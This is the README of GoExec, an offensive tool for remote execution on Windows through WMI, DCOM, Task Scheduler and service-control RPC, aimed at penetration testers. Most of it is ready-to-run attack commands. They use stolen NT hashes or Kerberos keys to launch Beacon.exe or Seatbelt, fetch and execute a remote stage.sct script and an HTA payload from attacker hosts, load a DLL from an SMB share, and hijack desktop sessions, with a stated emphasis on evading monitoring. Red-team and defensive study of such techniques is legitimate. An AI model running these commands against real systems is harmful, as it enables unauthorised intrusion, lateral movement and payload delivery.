# GoExec - Remote Execution Multitool

![goexec](https://github.com/user-attachments/assets/16782082-5a42-477c-95e2-46295bbe3c34)

GoExec is a new take on some of the methods used to gain remote execution on Windows devices. GoExec implements a number of largely unrealized execution methods and provides significant OPSEC improvements overall.

The original post about GoExec v0.1.0 can be found [here](https://www.falconops.com/blog/introducing-goexec)

## Installation

### Build & Install with Go

To build this project from source, you will need Go version 1.23.* or greater and a 64-bit target architecture. More information on managing Go installations can be found [here](https://go.dev/doc/manage-install)

```shell
# Install goexec
CGO_ENABLED=0 go install -ldflags="-s -w" github.com/FalconOpsLLC/goexec@latest
```

#### Manual Installation

For pre-release features, fetch the latest commit and build manually.

```shell
# (Linux) Install GoExec manually from source
# Fetch source
git clone https://github.com/FalconOpsLLC/goexec
cd goexec

# Build goexec (Go >= 1.23)
CGO_ENABLED=0 go build -ldflags="-s -w"

# (Optional) Install goexec to /usr/local/bin/goexec
sudo install goexec /usr/local/bin
```

### Install with Docker

We've provided a Dockerfile to build and run GoExec within Docker containers.

```shell
# (Linux) Install GoExec Docker image
# Fetch source
git clone https://github.com/FalconOpsLLC/goexec
cd goexec

# Build goexec image (as root/docker group)
docker build . --tag goexec --network host

# Run goexec via Docker container
alias goexec='sudo docker run -it --rm goexec'
goexec -h # display help menu
```

### Install from Release

You may also download [the latest release](https://github.com/FalconOpsLLC/goexec/releases/latest) for 64-bit Windows, macOS, or Linux.

## Usage

GoExec is made up of modules for each remote service used (i.e. `wmi`, `scmr`, etc.), and specific methods within each module (i.e. `wmi proc`, `scmr change`, etc.)

```text
Usage:
  goexec [command] [flags]

Execution Commands:
  dcom        Execute with Distributed Component Object Model (MS-DCOM)
  wmi         Execute with Windows Management Instrumentation (MS-WMI)
  scmr        Execute with Service Control Manager Remote (MS-SCMR)
  tsch        Execute with Windows Task Scheduler (MS-TSCH)

Additional Commands:
  help        Help about any command
  completion  Generate the autocompletion script for the specified shell

Logging:
  -D, --debug           Enable debug logging
  -O, --log-file file   Write JSON logging output to file
  -j, --json            Write logging output in JSON lines
  -q, --quiet           Disable info logging

Authentication:
  -u, --user user@domain      Username ('user@domain', 'domain\user', 'domain/user' or 'user')
  -p, --password string       Password
  -H, --nt-hash hash          NT hash ('NT', ':NT' or 'LM:NT')
      --aes-key hex key       Kerberos AES hex key
      --pfx file              Client certificate and private key as PFX file
      --pfx-password string   Password for PFX file
      --ccache file           Kerberos CCache file name (defaults to $KRB5CCNAME, currently unset)
      --dc string             Domain controller
  -k, --kerberos              Use Kerberos authentication
```

### Fetching Remote Process Output

Although not recommended for live engagements or monitored environments due to OPSEC concerns, we've included the optional ability to fetch program output via SMB file transfer with the `-o`/`--out` flag.
Use of this flag will wrap the supplied command in `cmd.exe /c... >\Windows\Temp\RANDOM` where `RANDOM` is a random GUID, then fetch the output file via SMB file transfer.
By default, the output collection will time out after 1 minute, but this can be adjusted with the `--out-timeout` flag.


### WMI Module (`wmi`)

The `wmi` module uses remote Windows Management Instrumentation (WMI) to spawn processes (`wmi proc`), or manually call a method (`wmi call`).

```text
Usage:
  goexec wmi [command] [flags]

Available Commands:
  proc        Start a Windows process
  call        Execute specified WMI method

... [inherited flags] ...

Network:
  -x, --proxy URI           Proxy URI
  -F, --epm-filter string   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
      --endpoint string     Explicit RPC endpoint definition
      --epm                 Use EPM to discover available bindings
      --no-sign             Disable signing on DCERPC messages
      --no-seal             Disable packet stub encryption on DCERPC message
```

#### Process Creation Method (`wmi proc`)

The `proc` method creates an instance of the `Win32_Process` WMI class, then calls the `Create` method to spawn a process with the provided arguments.

```text
Usage:
  goexec wmi proc [target] [flags]

Execution:
  -e, --exec string         Remote Windows executable to invoke
  -a, --args string         Process command line arguments
  -c, --command string      Windows process command line (executable &
                            arguments)
  -o, --out string          Fetch execution output to file or "-" for
                            standard output
  -m, --out-method string   Method to fetch execution output (default "smb")
      --no-delete-out       Preserve output file on remote filesystem
  -d, --directory string    Working directory (default "C:\\")

... [inherited flags] ...
```

##### Examples

```shell
# Run an executable without arguments
goexec wmi proc "$target" \
  -u "$auth_user" \
  -p "$auth_pass" \
  -e 'C:\Windows\Temp\Beacon.exe' \

# Authenticate with NT hash, fetch output from `cmd.exe /c whoami /all`
goexec wmi proc "$target" \
  -u "$auth_user" \
  -H "$auth_nt" \
  -e 'cmd.exe' \
  -a '/C whoami /all' \
  -o- # Fetch output to STDOUT
```

#### (Auxiliary) Call Method (`wmi call`)

The `call` method gives the operator full control over a WMI method call. You can list available classes and methods on Windows with PowerShell's [`Get-CimClass`](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/get-cimclass?view=powershell-7.5).

```text
Usage:
  goexec wmi call [target] [flags]

WMI:
  -n, --namespace string   WMI namespace (default "//./root/cimv2")
  -C, --class string       WMI class to instantiate (i.e. "Win32_Process")
  -m, --method string      WMI Method to call (i.e. "Create")
  -A, --args string        WMI Method argument(s) in JSON dictionary format (i.e. {"Command":"calc.exe"}) (default "{}")

... [inherited flags] ...
```

##### Examples

```shell
# Call StdRegProv.EnumKey - enumerate registry subkeys of HKLM\SYSTEM
goexec wmi call "$target" \
    -u "$auth_user" \
    -p "$auth_pass" \
    -C 'StdRegProv' \
    -m 'EnumKey' \
    -A '{"sSubKeyName":"SYSTEM"}'
```

### DCOM Module (`dcom`)

The `dcom` module uses exposed Distributed Component Object Model (DCOM) objects to gain remote execution.

> [!WARNING]
> The DCOM module is generally less reliable than other modules because the underlying methods are often reliant on the target Windows version and specific Windows settings.
> Additionally, Kerberos auth is not officially supported by the DCOM module, but kudos if you can get it to work.

```text
Usage:
  goexec dcom [command] [flags]

Available Commands:
  mmc                Execute with the MMC20.Application DCOM object
  shellwindows       Execute with the ShellWindows DCOM object
  shellbrowserwindow Execute with the ShellBrowserWindow DCOM object
  htafile            Execute with the HTAFile DCOM object
  excel              Execute with DCOM object(s) targeting Microsoft Excel
  visualstudio       Execute with DCOM object(s) targeting Microsoft Visual Studio

... [inherited flags] ...

Network:
  -x, --proxy URI            Proxy URI
  -F, --epm-filter binding   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
      --endpoint binding     Explicit RPC endpoint string binding
      --epm                  Use EPM to discover available bindings
      --no-sign              Disable signing on DCERPC messages
      --no-seal              Disable packet stub encryption on DCERPC messages
```

#### `MMC20.Application` Method (`dcom mmc`)

The `mmc` method instantiates a remote `MMC20.Application` object to call `Document.ActiveView.ShellExec`, and ultimately spawn a process on the remote host.

```text
Usage:
  goexec dcom mmc [target] [flags]

Execution:
  -e, --exec string            Remote Windows executable to invoke
  -a, --args string            Process command line arguments
  -c, --command string         Windows process command line (executable & arguments)
  -o, --out file               Fetch execution output to file or "-" for standard output
  -m, --out-method Method      Method to fetch execution output (default "smb")
      --out-timeout duration   Output timeout duration (default 1m0s)
      --no-delete-out          Preserve output file on remote filesystem
      --directory directory    Working directory (default "C:\\")
      --window string          Window state (default "Minimized"

... [inherited flags] ...
```

##### Examples

```shell
# Authenticate with NT hash, fetch output from `cmd.exe /c whoami /priv` to file
goexec dcom mmc "$target" \
  -u "$auth_user" \
  -H "$auth_nt" \
  -e 'cmd.exe' \
  -a '/c whoami /priv' \
  -o ./privs.bin # Save output to ./privs.bin
```

#### `ShellWindows` Method (`dcom shellwindows`)

The `shellwindows` method uses a [ShellWindows](https://learn.microsoft.com/en-us/windows/win32/shell/shellwindows) DCOM object to call `Item().Document.Application.ShellExecute` and spawn a remote process. This execution method isn't nearly as stable as the `dcom mmc` method for a few reasons:

- This method may not work on the latest Windows versions
- It may require that there is an active desktop session on the target machine.
- Successful execution may be on behalf of the desktop user, not necessarily an administrator.

```text
Usage:
  goexec dcom shellwindows [target] [flags]

Execution:
  -e, --exec executable        Remote Windows executable to invoke
  -a, --args string            Process command line arguments
  -c, --command string         Windows process command line (executable & arguments)
  -o, --out file               Fetch execution output to file or "-" for standard output
  -m, --out-method string      Method to fetch execution output (default "smb")
      --out-timeout duration   Output timeout duration (default 1m0s)
      --no-delete-out          Preserve output file on remote filesystem
      --directory directory    Working directory (default "C:\\")
      --app-window ID          Application window state ID (default "0")

... [inherited flags] ...
```

The app window argument (`--app-window`) must be one of the values described [here (`vShow` parameter)](https://learn.microsoft.com/en-us/windows/win32/shell/shell-shellexecute).

##### Examples

```shell
# Authenticate with local admin NT hash, execute `netstat.exe -anop tcp` w/ output
goexec dcom shellwindows "$target" \
  -u "$auth_user" \
  -H "$auth_nt" \
  -e 'netstat.exe' \
  -a '-anop tcp' \
  -o- # write to standard output

# Authenticate with local admin password, open maximized notepad window on desktop
goexec dcom shellwindows "$target" \
  -u "$auth_user" \
  -p "$auth_pass" \
  -e 'notepad.exe' \
  --directory 'C:\Windows' \
  --app-window 3 # Maximized
```

#### `ShellBrowserWindow` Method (`dcom shellbrowserwindow`)

The `shellbrowserwindow` method uses the exposed [ShellBrowserWindow](https://strontic.github.io/xcyclopedia/library/clsid_c08afd90-f2a1-11d1-8455-00a0c91f3880.html) DCOM object to call `Document.Application.ShellExecute` and spawn the provided process. The potential constraints of this method are similar to the [ShellWindows method](#shellwindows-method-dcom-shellwindows).

```text
Usage:
  goexec dcom shellbrowserwindow [target] [flags]

Execution:
  -e, --exec executable        Remote Windows executable to invoke
  -a, --args string            Process command line arguments
  -c, --command string         Windows process command line (executable & arguments)
  -o, --out file               Fetch execution output to file or "-" for standard output
  -m, --out-method string      Method to fetch execution output (default "smb")
      --out-timeout duration   Output timeout duration (default 1m0s)
      --no-delete-out          Preserve output file on remote filesystem
      --directory directory    Working directory (default "C:\\")
      --app-window ID          Application window state ID (default "0"

... [inherited flags] ...
```

##### Examples

```shell
# Authenticate with NT hash, open explorer.exe maximized
goexec dcom shellbrowserwindow "$target" \
  -u "$auth_user@$domain" \
  -H "$auth_nt" \
  -e 'explorer.exe' \
  --app-window 3
```

#### `htafile` Method (`dcom htafile`)

The `htafile` method uses the exposed HTML Application object to call [`IPersistMoniker.Load`](https://learn.microsoft.com/en-us/previous-versions/aa458529(v=msdn.10)) with a client-supplied [URL moniker](https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-oshared/4948a119-c4e4-46b6-9609-0525118552e8). The URL can point to a URL of any format supported by `mshta.exe`.

```text
Usage:
  goexec dcom htafile [target] [flags]

Execution:
  -U, --url URL                Load custom URL
      --js string              Execute JavaScript one-liner
      --vbs string             Execute VBScript one-liner
  -e, --exec executable        Remote Windows executable to invoke
  -a, --args string            Process command line arguments
  -c, --command string         Windows process command line (executable & arguments)
  -o, --out file               Fetch execution output to file or "-" for standard output
  -m, --out-method string      Method to fetch execution output (default "smb")
      --out-timeout duration   Output timeout duration (default 1m0s)
      --no-delete-out          Preserve output file on remote filesystem

... [inherited flags] ...
```

##### Examples

```shell
# Execute `net user` + print output
goexec dcom htafile "$target" \
  --user "${auth_user}@${domain}" \
  --password "$auth_pass" \
  --command 'net user' \
  --out -

# Execute blind WSH JavaScript one-liner using admin NT hash
goexec dcom htafile "$target" \
  --user "${auth_user}@${domain}" \
  --nt-hash "$auth_nt" \
  --js 'GetObject("script:http://10.0.0.10:8001/stage.sct").Exec();close()'

# Execute remote HTA file using admin NT hash
goexec dcom htafile "$target" \
  --user "${auth_user}@${domain}" \
  --nt-hash "$auth_nt" \
  --url "http://callback.lan/payload.hta"
```

#### Visual Studio `ExecuteCommand` Method (`dcom visualstudio dte`)

The `visualstudio dte` method uses the exposed `VisualStudio.DTE` object to spawn a process via the `ExecuteCommand` method.
This method requires that the remote host has Microsoft Visual Studio installed.

```text
Usage:
  goexec dcom visualstudio dte [target] [flags]

Visual Studio:
      --vs-2019             Target Visual Studio 2019
      --vs-command string   Visual Studio DTE command to execute
      --vs-args string      Visual Studio DTE command arguments

Execution:
  -e, --exec executable        Remote Windows executable to invoke
  -a, --args string            Process command line arguments
  -c, --command string         Windows process command line (executable & arguments)
  -o, --out file               Fetch execution output to file or "-" for standard output
  -m, --out-method string      Method to fetch execution output (default "smb")
      --out-timeout duration   Output timeout duration (default 1m0s)
      --no-delete-out          Preserve output file on remote filesystem
```

##### Examples

```shell
# Execute `sc query` (batch) + save output to services.txt
goexec dcom visualstudio dte "$target" \
  --user "${auth_user}@${domain}" \
  --password "$auth_pass" \
  --command 'sc query' -o services.txt

# Execute `cmd.exe /c set` with output, target Visual Studio 2019
goexec dcom visualstudio dte "$target" \
  --user "${auth_user}@${domain}" \
  --password "$auth_pass" \
  --vs-2019 \
  --exec 'cmd.exe' \
  --args '/c set' -o-
```

#### Excel Methods (`dcom excel`)

The `dcom excel` command group contains remote execution methods targeting Microsoft Excel.
Each of these methods assume that the remote host has Excel installed.

```text
Usage:
  goexec dcom excel [command] [flags]

Available Commands:
  macro       Execute using Excel 4.0 macros (XLM)
  xll         Execute by Loading an XLL add-in

... [inherited flags] ...
```

#### Excel `ExecuteExcel4Macro` Method (`dcom excel macro`)

The `excel macro` method uses the exposed `Excel.Application` DCOM object to call [`ExecuteExcel4Macro`](https://learn.microsoft.com/en-us/office/vba/api/excel.application.executeexcel4macro) with an arbitrary Excel 4.0 macro.
An Excel installation must be present on the remote host for this method to work.

```text
Usage:
  goexec dcom excel macro [target] [flags]

Execution:
  -M, --macro string           XLM macro
      --macro-file file        XLM macro file
  -e, --exec executable        Remote Windows executable to invoke
  -a, --args string            Process command line arguments
  -c, --command string         Windows process command line (executable & arguments)
  -o, --out file               Fetch execution output to file or "-" for standard output
  -m, --out-method string      Method to fetch execution output (default "smb")
      --out-timeout duration   Output timeout duration (default 1m0s)
      --no-delete-out          Preserve output file on remote filesystem

... [inherited flags] ...
```

##### Examples

```shell
# Execute `query session` + print output
goexec dcom excel macro "$target" \
  --user "${auth_user}@${domain}" \
  --password "$auth_pass" \
  --command 'query session' -o-

# Use admin NT hash to directly call a Win32 API procedure via XLM
goexec dcom excel macro "$target" \
  --user "${auth_user}@${domain}" \
  --nt-hash "$auth_nt" \
  -M 'CALL("user32","MessageBoxA","JJCCJ",1,"GoExec rules","bryan was here",0)'
```

#### (Auxiliary) Excel `RegisterXLL` Method (`dcom excel xll`)

The `xll` method uses the exposed Excel.Application DCOM object to call RegisterXLL, thus loading a XLL/DLL from the remote filesystem or an UNC path.
This method requires that the remote host has Microsoft Excel installed.

```text
Usage:
  goexec dcom excel xll [target] [flags]

Execution:
      --xll path   XLL/DLL local or UNC path

... [inherited flags] ...
```

##### Examples

```shell
# Use admin password to execute XLL/DLL from an uploaded file
goexec dcom excel xll "$target" \
  --user "${auth_user}" \
  --nt-hash "$auth_nt" \
  --xll 'C:\Users\localuser\Desktop\file.xll'

# Use admin NT hash to execute XLL/DLL from an SMB share
goexec dcom excel xll "$target" \
  --user "${auth_user}@${domain}" \
  --nt-hash "$auth_nt" \
  --xll '\\smbserver.lan\share\addin.xll'
```

### Task Scheduler Module (`tsch`)

The `tsch` module makes use of the Windows Task Scheduler service ([MS-TSCH](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/)) to spawn processes on the remote target.
```text
Usage:
  goexec tsch [command] [flags]

Available Commands:
  demand      Register a remote scheduled task and demand immediate start
  create      Create a remote scheduled task with an automatic start time
  change      Modify an existing task to spawn an arbitrary process

... [inherited flags] ...

Network:
  -x, --proxy URI            Proxy URI
  -F, --epm-filter binding   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
      --endpoint binding     Explicit RPC endpoint string binding
      --epm                  Use EPM to discover available bindings
      --no-sign              Disable signing on DCERPC messages
      --no-seal              Disable packet stub encryption on DCERPC messages
```

#### Create Scheduled Task (`tsch create`)


The `create` method registers a scheduled task using [SchRpcRegisterTask](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/849c131a-64e4-46ef-b015-9d4c599c5167) with an automatic start time via [TimeTrigger](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/385126bf-ed3a-4131-8d51-d88b9c00cfe9), and optional automatic deletion with the [DeleteExpiredTaskAfter](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/6bfde6fe-440e-4ddd-b4d6-c8fc0bc06fae) setting.
The stability of this method is heavily reliant on the target device having a correctly synced date/time, but this can be adjusted with the `--delay-stop` and `--start-delay` flags.

```text
Usage:
  goexec tsch create [target] [flags]

Task Scheduler:
  -t, --task string            Name or path of the new task
      --delay-stop duration    Delay between task execution and termination. This won't stop the spawned process (default 5s)
      --start-delay duration   Delay between task registration and execution (default 5s)
      --no-delete              Don't delete task after execution
      --call-delete            Directly call SchRpcDelete to delete task
      --sid SID                User SID to impersonate (default "S-1-5-18")

Execution:
  -e, --exec executable        Remote Windows executable to invoke
  -a, --args string            Process command line arguments
  -c, --command string         Windows process command line (executable & arguments)
  -o, --out file               Fetch execution output to file or "-" for standard output
  -m, --out-method string      Method to fetch execution output (default "smb")
      --out-timeout duration   Output timeout duration (default 1m0s)
      --no-delete-out          Preserve output file on remote filesystem

... [inherited flags] ...
```

##### Examples

```shell
# Authenticate with NT hash via Kerberos, 
#   register task at \Microsoft\Windows\GoExec,
#   execute `C:\Windows\Temp\Beacon.exe`
goexec tsch create "$target" \
  --user "${auth_user}@${domain}" \
  --nt-hash "$auth_nt" \
  --dc "$dc_ip" \
  --kerberos \
  --task '\Microsoft\Windows\GoExec' \
  --exec 'C:\Windows\Temp\Beacon.exe'

# Authenticate using Kerberos AES key,
#   execute `C:\Windows\Temp\Seatbelt.exe -group=system`,
#   collect output with lengthened (5 minute) timeout
goexec tsch create "$target" \
  --user "${auth_user}@${domain}" \
  --dc "$dc_ip" \
  --aes-key "$auth_aes" \
  --command 'C:\Windows\Temp\Seatbelt.exe -group=system' \
  --out ./seatbelt.out \
  --out-timeout 5m
```

#### Create Scheduled Task & Demand Start (`tsch demand`)

Similar to the `create` method, the `demand` method will call `SchRpcRegisterTask`, but rather than setting a defined time when the task will start, it will additionally call `SchRpcRun` to forcefully start the task. This method can additionally hijack desktop sessions when provided the session ID with `--session`.

```text
Usage:
  goexec tsch demand [target] [flags]

Task Scheduler:
  -t, --task string   Name or path of the new task
      --session ID    Hijack existing session given the session ID
      --sid SID       User SID to impersonate (default "S-1-5-18")
      --no-delete     Don't delete task after execution

Execution:
  -e, --exec executable        Remote Windows executable to invoke
  -a, --args string            Process command line arguments
  -c, --command string         Windows process command line (executable & arguments)
  -o, --out file               Fetch execution output to file or "-" for standard output
  -m, --out-method string      Method to fetch execution output (default "smb")
      --out-timeout duration   Output timeout duration (default 1m0s)
      --no-delete-out          Preserve output file on remote filesystem
```

##### Examples

```shell
# Use random task name, execute `notepad.exe` on desktop session 1
goexec tsch demand "$target" \
  --user "$auth_user" \
  --password "$auth_pass" \
  --exec 'notepad.exe' \
  --session 1

# Authenticate with NT hash via Kerberos,
#   register task at \Microsoft\Windows\GoExec (will be deleted),
#   execute `C:\Windows\System32\cmd.exe /c set` with output
goexec tsch demand "$target" \
  --user "${auth_user}@${domain}" \
  --nt-hash "$auth_nt" \
  --dc "$dc_ip" \
  --kerberos \
  --task '\Microsoft\Windows\GoExec' \
  --exec 'C:\Windows\System32\cmd.exe' \
  --args '/c set' \
  --out -
```

#### Modify Scheduled Task Definition (`tsch change`)

The `change` method calls `SchRpcRetrieveTask` to fetch the definition of an existing
task (`-t`/`--task`), then modifies the task definition to spawn a process before restoring the original.

```text
Usage:
  goexec tsch change [target] [flags]

Task Scheduler:
  -t, --task string   Path to existing task
      --no-start      Don't start the task
      --no-revert     Don't restore the original task definition

Execution:
  -e, --exec executable        Remote Windows executable to invoke
  -a, --args string            Process command line arguments
  -c, --command string         Windows process command line (executable & arguments)
  -o, --out file               Fetch execution output to file or "-" for standard output
  -m, --out-method string      Method to fetch execution output (default "smb")
      --out-timeout duration   Output timeout duration (default 1m0s)
      --no-delete-out          Preserve output file on remote filesystem

... [inherited flags] ...
```

##### Examples

```shell
# Enable debug logging, Modify "\Microsoft\Windows\UPnP\UPnPHostConfig" to run `cmd.exe /c whoami /all` with output
goexec tsch change $target --debug \
  -u "${auth_user}" \
  -p "${auth_pass}" \
  -t '\Microsoft\Windows\UPnP\UPnPHostConfig' \
  -e 'cmd.exe' \
  -a '/C whoami /all' \
  -o >(tr -d '\r') # Send output to another program (zsh/bash)
```

### SCMR Module (`scmr`)

The SCMR module works a lot like [`smbexec.py`](https://github.com/fortra/impacket/blob/master/examples/smbexec.py), but it provides additional RPC transports to evade network monitoring or firewall rules, and some minor OPSEC improvements overall.

> [!WARNING]
> The `scmr` module cannot fetch process output at the moment. This will be added in a future release.

```text
Usage:
  goexec scmr [command] [flags]

Available Commands:
  create      Spawn a remote process by creating & running a Windows service
  change      Change an existing Windows service to spawn an arbitrary process
  delete      Delete an existing Windows service

... [inherited flags] ...

Network:
  -x, --proxy URI            Proxy URI
  -F, --epm-filter binding   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
      --endpoint binding     Explicit RPC endpoint string binding
      --epm                  Use EPM to discover available bindings
      --no-sign              Disable signing on DCERPC messages
      --no-seal              Disable packet stub encryption on DCERPC messages
```

#### Create Service (`scmr create`)

The `create` method is used to spawn a process by creating a Windows service. This method requires the full path to a remote executable (i.e. `C:\Windows\System32\calc.exe`)

```text
Usage:
  goexec scmr create [target] [flags]

Execution:
  -f, --executable-path string   Full path to a remote Windows executable
  -a, --args string              Arguments to pass to the executable

Service:
  -n, --display-name string   Display name of service to create
  -s, --service string        Name of service to create
      --no-delete             Don't delete service after execution
      --no-start              Don't start service

... [inherited flags] ...
```

##### Examples

```shell
# Use MSRPC instead of SMB, use custom service name, execute `cmd.exe`
goexec scmr create "$target" \
  -u "${auth_user}@${domain}" \
  -p "$auth_pass" \
  -f 'C:\Windows\System32\cmd.exe' \
  --epm -F 'ncacn_ip_tcp:'

# Directly dial svcctl named pipe ("ncacn_np:[svcctl]"),
#   use random service name,
#   execute `C:\Windows\System32\calc.exe` 
goexec scmr create "$target" \
  -u "${auth_user}@${domain}" \
  -p "$auth_pass" \
  -f 'C:\Windows\System32\calc.exe' \
  --endpoint 'ncacn_np:[svcctl]'
```

#### Modify Service (`scmr change`)

The SCMR module's `change` method executes programs by modifying existing Windows services using the RChangeServiceConfigW method rather than calling RCreateServiceW like `scmr create`. The modified service is restored to its original state after execution

> [!WARNING]
> Using this module on important Windows services may brick the OS. Try using a less important service like `PlugPlay`.

```text
Usage:
  goexec scmr change [target] [flags]

Service Control:
  -s, --service-name string   Name of service to modify
      --no-start              Don't start service

Execution:
  -f, --executable-path string   Full path to remote Windows executable
  -a, --args string              Arguments to pass to executable

... [inherited flags] ...
```

##### Examples

```shell
# Used named pipe transport, Modify the PlugPlay service to execute `C:\Windows\System32\cmd.exe /c C:\Windows\Temp\stage.bat`
goexec scmr change $target \
  -u "$auth_user" \
  -p "$auth_pass" \
  -F "ncacn_np:" \
  -s PlugPlay \
  -f 'C:\Windows\System32\cmd.exe' \
  -a '/c C:\Windows\Temp\stage.bat'
```

#### (Auxiliary) Delete Service

The SCMR module's auxiliary `delete` method will simply delete the provided service.

```text
Usage:
  goexec scmr delete [target] [flags]

Service Control:
  -s, --service-name string   Name of service to delete

... [inherited flags] ...
```

## Acknowledgements

- [@oiweiwei](https://github.com/oiweiwei) for the wonderful [go-msrpc](https://github.com/oiweiwei/go-msrpc) module
- [@RedTeamPentesting](https://github.com/RedTeamPentesting) and [Erik Geiser](https://github.com/rtpt-erikgeiser) for the [adauth](https://github.com/RedTeamPentesting/adauth) module
- The developers and contributors of [Impacket](https://github.com/fortra/impacket) for the inspiration and technical reference
